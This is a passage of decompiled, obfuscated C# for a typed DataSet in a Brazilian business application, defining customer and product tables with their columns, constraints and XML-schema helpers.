			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DAT_NASCColumn => columnDAT_NASC;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn DAT_CADColumn => columnDAT_CAD;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn EMAILColumn => columnEMAIL;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn FACEBOOKColumn => columnFACEBOOK;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CONTATOColumn => columnCONTATO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CNPJColumn => columnCNPJ;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn INSColumn => columnINS;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CPFColumn => columnCPF;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn RGColumn => columnRG;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn OBSERVACAOColumn => columnOBSERVACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn BAIRROColumn => columnBAIRRO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn FILIACAOColumn => columnFILIACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[Browsable(false)]
			[DebuggerNonUserCode]
			public int Count => base.Rows.Count;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CADCLIRow this[int index] => (TB_CADCLIRow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CADCLIRowChangeEventHandler TB_CADCLIRowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CADCLIRowChangeEventHandler TB_CADCLIRowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CADCLIRowChangeEventHandler TB_CADCLIRowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CADCLIRowChangeEventHandler TB_CADCLIRowDeleted;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADCLIDataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1288);
				BeginInit();
				InitClass();
				EndInit();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_CADCLIDataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected TB_CADCLIDataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void AddTB_CADCLIRow(TB_CADCLIRow row)
			{
				base.Rows.Add(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CADCLIRow AddTB_CADCLIRow(string NOME_CLI, string APELIDO, string ENDERECO, string CIDADE, string UF, string CEP, string TEL_CEL, string TEL_RES, string COMPLEMENTO, string DAT_NASC, string DAT_CAD, string EMAIL, string FACEBOOK, string CONTATO, string CNPJ, string INS, string CPF, string RG, string OBSERVACAO, string BAIRRO, string FILIACAO)
			{
				TB_CADCLIRow tB_CADCLIRow = (TB_CADCLIRow)NewRow();
				object[] itemArray = new object[22]
				{
					null, NOME_CLI, APELIDO, ENDERECO, CIDADE, UF, CEP, TEL_CEL, TEL_RES, COMPLEMENTO,
					DAT_NASC, DAT_CAD, EMAIL, FACEBOOK, CONTATO, CNPJ, INS, CPF, RG, OBSERVACAO,
					BAIRRO, FILIACAO
				};
				tB_CADCLIRow.ItemArray = itemArray;
				base.Rows.Add(tB_CADCLIRow);
				return tB_CADCLIRow;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADCLIRow FindByCódigo(int Código)
			{
				return (TB_CADCLIRow)base.Rows.Find(new object[1] { Código });
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public override DataTable Clone()
			{
				TB_CADCLIDataTable tB_CADCLIDataTable = (TB_CADCLIDataTable)base.Clone();
				tB_CADCLIDataTable.InitVars();
				return tB_CADCLIDataTable;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataTable CreateInstance()
			{
				return new TB_CADCLIDataTable();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal void InitVars()
			{
				columnCódigo = base.Columns[\u0004.\u0001.\u0001(2290)];
				columnNOME_CLI = base.Columns[\u0004.\u0001.\u0001(2306)];
				columnAPELIDO = base.Columns[\u0004.\u0001.\u0001(2326)];
				columnENDERECO = base.Columns[\u0004.\u0001.\u0001(2344)];
				columnCIDADE = base.Columns[\u0004.\u0001.\u0001(2364)];
				columnUF = base.Columns[\u0004.\u0001.\u0001(2380)];
				columnCEP = base.Columns[\u0004.\u0001.\u0001(2388)];
				columnTEL_CEL = base.Columns[\u0004.\u0001.\u0001(2398)];
				columnTEL_RES = base.Columns[\u0004.\u0001.\u0001(2416)];
				columnCOMPLEMENTO = base.Columns[\u0004.\u0001.\u0001(2434)];
				columnDAT_NASC = base.Columns[\u0004.\u0001.\u0001(2460)];
				columnDAT_CAD = base.Columns[\u0004.\u0001.\u0001(2480)];
				columnEMAIL = base.Columns[\u0004.\u0001.\u0001(2498)];
				columnFACEBOOK = base.Columns[\u0004.\u0001.\u0001(2512)];
				columnCONTATO = base.Columns[\u0004.\u0001.\u0001(2532)];
				columnCNPJ = base.Columns[\u0004.\u0001.\u0001(2550)];
				columnINS = base.Columns[\u0004.\u0001.\u0001(2562)];
				columnCPF = base.Columns[\u0004.\u0001.\u0001(2572)];
				columnRG = base.Columns[\u0004.\u0001.\u0001(2582)];
				columnOBSERVACAO = base.Columns[\u0004.\u0001.\u0001(2590)];
				columnBAIRRO = base.Columns[\u0004.\u0001.\u0001(2614)];
				columnFILIACAO = base.Columns[\u0004.\u0001.\u0001(2630)];
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			private void InitClass()
			{
				columnCódigo = new DataColumn(\u0004.\u0001.\u0001(2290), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnCódigo);
				columnNOME_CLI = new DataColumn(\u0004.\u0001.\u0001(2306), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnNOME_CLI);
				columnAPELIDO = new DataColumn(\u0004.\u0001.\u0001(2326), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnAPELIDO);
				columnENDERECO = new DataColumn(\u0004.\u0001.\u0001(2344), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnENDERECO);
				columnCIDADE = new DataColumn(\u0004.\u0001.\u0001(2364), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCIDADE);
				columnUF = new DataColumn(\u0004.\u0001.\u0001(2380), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnUF);
				columnCEP = new DataColumn(\u0004.\u0001.\u0001(2388), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCEP);
				columnTEL_CEL = new DataColumn(\u0004.\u0001.\u0001(2398), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnTEL_CEL);
				columnTEL_RES = new DataColumn(\u0004.\u0001.\u0001(2416), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnTEL_RES);
				columnCOMPLEMENTO = new DataColumn(\u0004.\u0001.\u0001(2434), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCOMPLEMENTO);
				columnDAT_NASC = new DataColumn(\u0004.\u0001.\u0001(2460), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDAT_NASC);
				columnDAT_CAD = new DataColumn(\u0004.\u0001.\u0001(2480), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDAT_CAD);
				columnEMAIL = new DataColumn(\u0004.\u0001.\u0001(2498), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnEMAIL);
				columnFACEBOOK = new DataColumn(\u0004.\u0001.\u0001(2512), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnFACEBOOK);
				columnCONTATO = new DataColumn(\u0004.\u0001.\u0001(2532), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCONTATO);
				columnCNPJ = new DataColumn(\u0004.\u0001.\u0001(2550), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCNPJ);
				columnINS = new DataColumn(\u0004.\u0001.\u0001(2562), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnINS);
				columnCPF = new DataColumn(\u0004.\u0001.\u0001(2572), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCPF);
				columnRG = new DataColumn(\u0004.\u0001.\u0001(2582), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnRG);
				columnOBSERVACAO = new DataColumn(\u0004.\u0001.\u0001(2590), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnOBSERVACAO);
				columnBAIRRO = new DataColumn(\u0004.\u0001.\u0001(2614), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnBAIRRO);
				columnFILIACAO = new DataColumn(\u0004.\u0001.\u0001(2630), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnFILIACAO);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnCódigo }, isPrimaryKey: true));
				columnCódigo.AutoIncrement = true;
				columnCódigo.AutoIncrementSeed = -1L;
				columnCódigo.AutoIncrementStep = -1L;
				columnCódigo.AllowDBNull = false;
				columnCódigo.Unique = true;
				columnNOME_CLI.MaxLength = 50;
				columnAPELIDO.MaxLength = 20;
				columnENDERECO.MaxLength = 30;
				columnCIDADE.MaxLength = 30;
				columnUF.MaxLength = 2;
				columnCEP.MaxLength = 9;
				columnTEL_CEL.MaxLength = 12;
				columnTEL_RES.MaxLength = 12;
				columnCOMPLEMENTO.MaxLength = 60;
				columnDAT_NASC.MaxLength = 10;
				columnDAT_CAD.MaxLength = 10;
				columnEMAIL.MaxLength = 50;
				columnFACEBOOK.MaxLength = 50;
				columnCONTATO.MaxLength = 30;
				columnCNPJ.MaxLength = 18;
				columnINS.MaxLength = 18;
				columnCPF.MaxLength = 14;
				columnRG.MaxLength = 18;
				columnOBSERVACAO.MaxLength = 150;
				columnBAIRRO.MaxLength = 30;
				columnFILIACAO.MaxLength = 80;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CADCLIRow NewTB_CADCLIRow()
			{
				return (TB_CADCLIRow)NewRow();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_CADCLIRow(builder);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override Type GetRowType()
			{
				return typeof(TB_CADCLIRow);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void RemoveTB_CADCLIRow(TB_CADCLIRow row)
			{
				base.Rows.Remove(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(2882)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_CADPRODDataTable : DataTable, IEnumerable
		{
			private DataColumn columnCódigo;

			private DataColumn columnDESCRICAO;

			private DataColumn columnCOD_BARRAS;

			private DataColumn columnQUANTIDADE_COMPRA;

			private DataColumn columnCATEGORIA;

			private DataColumn columnESTOQUE_ATUAL;

			private DataColumn columnDAT_VALIDADE;

			private DataColumn columnPRECO_CUSTO;

			private DataColumn columnPRECO_PRODUTO;

			private DataColumn columnDAT_ULT_COMPRA;

			private DataColumn columnOBSERVACAO;

			private DataColumn columnNOME_FORNECEDOR;

			private DataColumn columnFONE_FORNECEDOR;

			private DataColumn columnMARGEM_LUCRO;

			private DataColumn columnEMAIL;

			private DataColumn columnSITE;

			private DataColumn columnFACEBOOK;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CódigoColumn => columnCódigo;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn DESCRICAOColumn => columnDESCRICAO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn COD_BARRASColumn => columnCOD_BARRAS;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn QUANTIDADE_COMPRAColumn => columnQUANTIDADE_COMPRA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CATEGORIAColumn => columnCATEGORIA;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn ESTOQUE_ATUALColumn => columnESTOQUE_ATUAL;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DAT_VALIDADEColumn => columnDAT_VALIDADE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn PRECO_CUSTOColumn => columnPRECO_CUSTO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn PRECO_PRODUTOColumn => columnPRECO_PRODUTO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn DAT_ULT_COMPRAColumn => columnDAT_ULT_COMPRA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn OBSERVACAOColumn => columnOBSERVACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn NOME_FORNECEDORColumn => columnNOME_FORNECEDOR;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn FONE_FORNECEDORColumn => columnFONE_FORNECEDOR;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn MARGEM_LUCROColumn => columnMARGEM_LUCRO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn EMAILColumn => columnEMAIL;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn SITEColumn => columnSITE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn FACEBOOKColumn => columnFACEBOOK;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[Browsable(false)]
			[DebuggerNonUserCode]
			public int Count => base.Rows.Count;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADPRODRow this[int index] => (TB_CADPRODRow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CADPRODRowChangeEventHandler TB_CADPRODRowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CADPRODRowChangeEventHandler TB_CADPRODRowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CADPRODRowChangeEventHandler TB_CADPRODRowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CADPRODRowChangeEventHandler TB_CADPRODRowDeleted;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADPRODDataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1310);
				BeginInit();
				InitClass();
				EndInit();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_CADPRODDataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected TB_CADPRODDataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void AddTB_CADPRODRow(TB_CADPRODRow row)
			{
				base.Rows.Add(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADPRODRow AddTB_CADPRODRow(string DESCRICAO, string COD_BARRAS, int QUANTIDADE_COMPRA, string CATEGORIA, int ESTOQUE_ATUAL, DateTime DAT_VALIDADE, decimal PRECO_CUSTO, decimal PRECO_PRODUTO, DateTime DAT_ULT_COMPRA, string OBSERVACAO, string NOME_FORNECEDOR, string FONE_FORNECEDOR, int MARGEM_LUCRO, string EMAIL, string SITE, string FACEBOOK)
			{
				TB_CADPRODRow tB_CADPRODRow = (TB_CADPRODRow)NewRow();
				object[] itemArray = new object[17]
				{
					null, DESCRICAO, COD_BARRAS, QUANTIDADE_COMPRA, CATEGORIA, ESTOQUE_ATUAL, DAT_VALIDADE, PRECO_CUSTO, PRECO_PRODUTO, DAT_ULT_COMPRA,
					OBSERVACAO, NOME_FORNECEDOR, FONE_FORNECEDOR, MARGEM_LUCRO, EMAIL, SITE, FACEBOOK
				};
				tB_CADPRODRow.ItemArray = itemArray;
				base.Rows.Add(tB_CADPRODRow);
				return tB_CADPRODRow;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADPRODRow FindByCódigo(int Código)
			{
				return (TB_CADPRODRow)base.Rows.Find(new object[1] { Código });
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public override DataTable Clone()
			{
				TB_CADPRODDataTable tB_CADPRODDataTable = (TB_CADPRODDataTable)base.Clone();
				tB_CADPRODDataTable.InitVars();
				return tB_CADPRODDataTable;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataTable CreateInstance()
			{
				return new TB_CADPRODDataTable();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal void InitVars()
			{
				columnCódigo = base.Columns[\u0004.\u0001.\u0001(2290)];
				columnDESCRICAO = base.Columns[\u0004.\u0001.\u0001(2922)];
				columnCOD_BARRAS = base.Columns[\u0004.\u0001.\u0001(2944)];
				columnQUANTIDADE_COMPRA = base.Columns[\u0004.\u0001.\u0001(2968)];
				columnCATEGORIA = base.Columns[\u0004.\u0001.\u0001(3006)];
				columnESTOQUE_ATUAL = base.Columns[\u0004.\u0001.\u0001(3028)];
				columnDAT_VALIDADE = base.Columns[\u0004.\u0001.\u0001(3058)];
				columnPRECO_CUSTO = base.Columns[\u0004.\u0001.\u0001(3086)];
				columnPRECO_PRODUTO = base.Columns[\u0004.\u0001.\u0001(3112)];
				columnDAT_ULT_COMPRA = base.Columns[\u0004.\u0001.\u0001(3142)];
				columnOBSERVACAO = base.Columns[\u0004.\u0001.\u0001(2590)];
				columnNOME_FORNECEDOR = base.Columns[\u0004.\u0001.\u0001(3174)];
				columnFONE_FORNECEDOR = base.Columns[\u0004.\u0001.\u0001(3208)];
				columnMARGEM_LUCRO = base.Columns[\u0004.\u0001.\u0001(3242)];
				columnEMAIL = base.Columns[\u0004.\u0001.\u0001(2498)];
				columnSITE = base.Columns[\u0004.\u0001.\u0001(3270)];
				columnFACEBOOK = base.Columns[\u0004.\u0001.\u0001(2512)];
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			private void InitClass()
			{
				columnCódigo = new DataColumn(\u0004.\u0001.\u0001(2290), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnCódigo);
				columnDESCRICAO = new DataColumn(\u0004.\u0001.\u0001(2922), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDESCRICAO);
				columnCOD_BARRAS = new DataColumn(\u0004.\u0001.\u0001(2944), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCOD_BARRAS);
				columnQUANTIDADE_COMPRA = new DataColumn(\u0004.\u0001.\u0001(2968), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnQUANTIDADE_COMPRA);
				columnCATEGORIA = new DataColumn(\u0004.\u0001.\u0001(3006), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCATEGORIA);
				columnESTOQUE_ATUAL = new DataColumn(\u0004.\u0001.\u0001(3028), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnESTOQUE_ATUAL);
				columnDAT_VALIDADE = new DataColumn(\u0004.\u0001.\u0001(3058), typeof(DateTime), null, MappingType.Element);
				base.Columns.Add(columnDAT_VALIDADE);
				columnPRECO_CUSTO = new DataColumn(\u0004.\u0001.\u0001(3086), typeof(decimal), null, MappingType.Element);
				base.Columns.Add(columnPRECO_CUSTO);
				columnPRECO_PRODUTO = new DataColumn(\u0004.\u0001.\u0001(3112), typeof(decimal), null, MappingType.Element);
				base.Columns.Add(columnPRECO_PRODUTO);
				columnDAT_ULT_COMPRA = new DataColumn(\u0004.\u0001.\u0001(3142), typeof(DateTime), null, MappingType.Element);
				base.Columns.Add(columnDAT_ULT_COMPRA);
				columnOBSERVACAO = new DataColumn(\u0004.\u0001.\u0001(2590), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnOBSERVACAO);
				columnNOME_FORNECEDOR = new DataColumn(\u0004.\u0001.\u0001(3174), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnNOME_FORNECEDOR);
				columnFONE_FORNECEDOR = new DataColumn(\u0004.\u0001.\u0001(3208), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnFONE_FORNECEDOR);
				columnMARGEM_LUCRO = new DataColumn(\u0004.\u0001.\u0001(3242), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnMARGEM_LUCRO);
				columnEMAIL = new DataColumn(\u0004.\u0001.\u0001(2498), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnEMAIL);
				columnSITE = new DataColumn(\u0004.\u0001.\u0001(3270), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnSITE);
				columnFACEBOOK = new DataColumn(\u0004.\u0001.\u0001(2512), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnFACEBOOK);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnCódigo }, isPrimaryKey: true));
				columnCódigo.AutoIncrement = true;
				columnCódigo.AutoIncrementSeed = -1L;
				columnCódigo.AutoIncrementStep = -1L;
				columnCódigo.AllowDBNull = false;
				columnCódigo.Unique = true;
				columnDESCRICAO.MaxLength = 60;
				columnCOD_BARRAS.MaxLength = 18;
				columnCATEGORIA.MaxLength = 20;
				columnOBSERVACAO.MaxLength = 100;
				columnNOME_FORNECEDOR.MaxLength = 50;
				columnFONE_FORNECEDOR.MaxLength = 17;
				columnEMAIL.MaxLength = 50;
